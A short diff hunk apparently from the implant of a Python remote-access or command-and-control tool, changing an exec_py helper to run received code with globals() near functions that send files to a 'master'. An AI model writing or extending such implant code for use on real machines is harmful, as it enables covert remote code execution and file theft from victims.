@@ -60,7 +60,7 @@ def send_file(filename, url=None):
         print_debug(e)
 
 def exec_py(cmd):
-    exec(cmd)
+    exec(cmd, globals())
 
 # Master types "download". This function fulfills the command.
 # From the implant's perspective, this is an upload
